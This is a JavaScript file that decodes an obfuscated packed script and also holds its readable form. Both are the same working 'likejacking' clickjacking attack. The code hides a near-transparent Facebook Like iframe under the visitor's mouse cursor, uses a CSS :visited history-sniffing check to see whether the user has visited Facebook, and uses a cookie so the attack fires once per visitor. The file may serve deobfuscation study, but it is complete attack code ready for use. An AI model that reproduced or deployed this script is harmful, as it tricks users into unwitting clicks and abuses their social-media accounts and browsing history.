function myx(l, i, n, k, m, e) {
	m = function(c) {
		return (c < i ? '' : m(parseInt(c / i)))
				+ ((c = c % i) > 35 ? String.fromCharCode(c + 29) : c
						.toString(36))
	};
	while (n--) {
		if (k[n]) {
			l = l.replace(new RegExp('\\b' + m(n) + '\\b', 'g'), k[n])
		}
	}
	return l
}

var op = myx(
		'4 7=3.p(\'1u\');7.1n=\'q\';7.2.T=\'X\';7.2.W=0.1m;7.2.1o=\'1q(W=1)\';7.2.C=\'V\';'
				+ '7.2.z=\'V\';7.2.k=\'1y\';7.2.K=\'-U\';7.2.J=\'-U\';4 g;3.u.r(7);4 6=3.p(\'19\');'
				+ '6.1K=\'1e://1f.1c.17/1D/1C.1B?1d=\'+1A;6.1E=\'S\';6.1J=\'S\';6.2.T=\'X\';'
				+ '6.2.K=\'G\';6.2.J=\'G\';6.2.1x=1;6.2.z=\'Y\';6.2.C=\'Y\';6.2.1p=\'G\';'
				+ '3.I(\'q\').r(6);3.1g(\'\');9 P(){1i();5(1r||w){5(13()){3.1s=Q;4 14=\'1k()\';'
				+ '4 1w=1v(14,1t)}}};9 13(){5(1z){5(11(\'t\')==s){R(\'t\',1,1Z);'
				+ 'h v}h 1l}e{h v}}9 R(m,Z,E){5(E){4 o=25 1L();o.22(o.21()+(E*24*12*12*28));4 l=";'
				+ ' l="+o.1X()}e 4 l="";3.15=m+"="+Z+l+"; 1Q=/"}9 11(m){4 B=m+"=";4 F=3.15.1O(\';\');'
				+ '1M(4 i=0;i<F.n;i++){4 c=F[i];1N(c.1R(0)==\' \')c=c.L(1,c.n);'
				+ '5(c.1S(B)==0)h c.L(B.n,c.n)}h s}9 Q(A){g=3.I(\'q\');'
				+ 'x=(3.16)?M.O.x+g.N.1V:A.1U;y=(3.16)?M.O.y+g.N.1T:A.27;'
				+ 'g.2.K=(x-20)+\'1j\';g.2.J=(y-10)+\'1j\'};9 1k(){3.I(\'q\').2.k=\'D\'};'
				+ '9 1b(8){4 f=s;5(8==1W){f=3}e{5(8.1h){f=8.1h}e{5(8.1a){f=8.1a.3}e{5(8.3){f=8.3}}}};h f};'
				+ '9 1i(){4 b=3.p(\'19\');b.2.1Y=\'1P\';b.2.C=b.2.z=0;3.u.r(b);'
				+ '4 d=1b(b);d.26();d.1g(\'<2>a:23{k: D}</2>\');d.29();4 j=d.p(\'a\');'
				+ 'j.1d=\'1e://1f.1c.17\';d.u.r(j);5(j.18){4 H=j.18.k}e{4 H=d.1I.1F(j,s).1H(\'k\')};'
				+ '5(H==\'D\'){w=v}e{w=1l};3.u.1G(b)};P();',
		62,
		134,
		'||style|document|var|if|a5497|g9301|y7602|function||w1089||x8419|else|i6263|z4149|return||n5583|display|expires|name|length|date|createElement|z2634|appendChild|null||body|true|b3780|||height|k3372|nameEQ|width|none|days|ca|0px|x2409|getElementById|top|left|substring|window|offsetParent|event|t1948|n4229|createCookie|no|position|100px|50px|opacity|absolute|40px|value||readCookie|60|dothecookie|test|cookie|all|com|currentStyle|iframe|contentWindow|w5344|facebook|href|http|www|write|contentDocument|k8725|px|m3109|false|01|id|filter|border|alpha|force|onmousemove|timedelay|div|setTimeout|k7041|zIndex|block|dothecookiedance|targetUrl|php|like|widgets|frameborder|getComputedStyle|removeChild|getPropertyValue|defaultView|scrolling|src|Date|for|while|split|hidden|path|charAt|indexOf|scrollTop|pageX|scrollLeft|undefined|toGMTString|visibility|cookiedays||getTime|setTime|visited||new|open|pageY|1000|close'
				.split('|'));

console.info("op:")
console.info(op);

var g9301 = document.createElement('div');
g9301.id = 'z2634';
g9301.style.position = 'absolute';
g9301.style.opacity = 0.01;
g9301.style.filter = 'alpha(opacity=1)';
g9301.style.width = '50px';
g9301.style.height = '50px';
g9301.style.display = 'block';
g9301.style.left = '-100px';
g9301.style.top = '-100px';
var z4149;
document.body.appendChild(g9301);
var a5497 = document.createElement('iframe');
a5497.src = 'http://www.facebook.com/widgets/like.php?href=' + targetUrl;
a5497.frameborder = 'no';
a5497.scrolling = 'no';
a5497.style.position = 'absolute';
a5497.style.left = '0px';
a5497.style.top = '0px';
a5497.style.zIndex = 1;
a5497.style.height = '40px';
a5497.style.width = '40px';
a5497.style.border = '0px';
document.getElementById('z2634').appendChild(a5497);
document.write('');
function t1948() {
	k8725();
	if (force || b3780) {
		if (dothecookie()) {
			document.onmousemove = n4229;
			var test = 'm3109()';
			var k7041 = setTimeout(test, timedelay)
		}
	}
};
function dothecookie() {
	if (dothecookiedance) {
		if (readCookie('t') == null) {
			createCookie('t', 1, cookiedays);
			return true
		}
		return false
	} else {
		return true
	}
}
function createCookie(name, value, days) {
	if (days) {
		var date = new Date();
		date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
		var expires = "; expires=" + date.toGMTString()
	} else
		var expires = "";
	document.cookie = name + "=" + value + expires + "; path=/"
}
function readCookie(name) {
	var nameEQ = name + "=";
	var ca = document.cookie.split(';');
	for ( var i = 0; i < ca.length; i++) {
		var c = ca[i];
		while (c.charAt(0) == ' ')
			c = c.substring(1, c.length);
		if (c.indexOf(nameEQ) == 0)
			return c.substring(nameEQ.length, c.length)
	}
	return null
}
function n4229(k3372) {
	z4149 = document.getElementById('z2634');
	x = (document.all) ? window.event.x + z4149.offsetParent.scrollLeft
			: k3372.pageX;
	y = (document.all) ? window.event.y + z4149.offsetParent.scrollTop
			: k3372.pageY;
	z4149.style.left = (x - 20) + 'px';
	z4149.style.top = (y - 10) + 'px'
};
function m3109() {
	document.getElementById('z2634').style.display = 'none'
};
function w5344(y7602) {
	var i6263 = null;
	if (y7602 == undefined) {
		i6263 = document
	} else {
		if (y7602.contentDocument) {
			i6263 = y7602.contentDocument
		} else {
			if (y7602.contentWindow) {
				i6263 = y7602.contentWindow.document
			} else {
				if (y7602.document) {
					i6263 = y7602.document
				}
			}
		}
	}
	;
	return i6263
};
function k8725() {
	var w1089 = document.createElement('iframe');
	w1089.style.visibility = 'hidden';
	w1089.style.width = w1089.style.height = 0;
	document.body.appendChild(w1089);
	var x8419 = w5344(w1089);
	x8419.open();
	x8419.write('<style>a:visited{display: none}</style>');
	x8419.close();
	var n5583 = x8419.createElement('a');
	n5583.href = 'http://www.facebook.com';
	x8419.body.appendChild(n5583);
	if (n5583.currentStyle) {
		var x2409 = n5583.currentStyle.display
	} else {
		var x2409 = x8419.defaultView.getComputedStyle(n5583, null)
				.getPropertyValue('display')
	}
	;
	if (x2409 == 'none') {
		b3780 = true
	} else {
		b3780 = false
	}
	;
	document.body.removeChild(w1089)
};
t1948();